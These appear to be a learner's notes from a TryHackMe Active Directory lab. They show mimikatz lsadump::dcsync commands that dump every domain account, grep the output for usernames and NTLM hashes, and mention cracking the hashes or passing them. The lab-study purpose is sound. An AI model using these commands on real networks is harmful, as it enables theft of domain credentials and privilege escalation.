We are using a low privilege user to harvest some creds with mimikatz
here.

We are doing this to get a domain controller sync for all accounts accross
the network to see how many credentials we can harvest with this method.

This is great for persistence or just a general exploit, but since its 
technically harvesting, ive put it into my harvesting directory.

We are generally looking for domain admin's accounts, or anything that
can bring us up to the next level within this.

C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

Start by performing a domain controller sync of our own single account
within the network:
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>

now, here we want to log and sync every account within the network:

log <username>_dcdump.txt 

lsadump::dcsync /domain:za.tryhackme.loc /all

cat <username>_dcdump.txt | grep "SAM Username"
cat <username>_dcdump.txt | grep "Hash NTLM"

Now with this, we can do a offline password hash crack, or simply do pass
the hash with mimikatz.
